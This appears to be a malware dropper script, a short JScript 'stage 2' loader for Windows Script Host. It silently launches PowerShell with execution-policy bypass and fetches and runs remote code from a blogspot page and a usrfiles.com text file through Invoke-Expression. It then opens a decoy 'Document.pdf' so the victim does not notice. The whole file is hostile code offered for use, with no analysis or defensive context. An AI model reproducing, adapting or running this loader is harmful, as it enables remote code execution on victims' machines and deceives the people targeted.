// Final Working Stage 2 - No Browser Dependencies
var wsh = new ActiveXObject("WScript.Shell");

var cmd = '-ep Bypass -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; ' +
         'Invoke-Expression (IRM \'https://aprilcap.blogspot.com/2026/04/chut.docx.pdf.html\'); ' +
         'Start-Sleep -Seconds 8; ' +
         'try { Invoke-Expression (IRM \'https://a37b157d-8823-4ec3-8447-919c9b91e4e3.usrfiles.com/ugd/a37b15_0c50ae2abd084521bc250008745a56f8.txt\') } catch(e) {}"';

wsh.Run("powershell.exe " + cmd, 0, false);

// Decoy PDF using PowerShell instead (more reliable)
var decoyCmd = '-ep Bypass -c "Invoke-WebRequest -Uri \'https://www.google.com\' -OutFile \'$env:USERPROFILE\\Downloads\\Document.pdf\'; Start-Process \'$env:USERPROFILE\\Downloads\\Document.pdf\'"';
wsh.Run("powershell.exe " + decoyCmd, 0, false);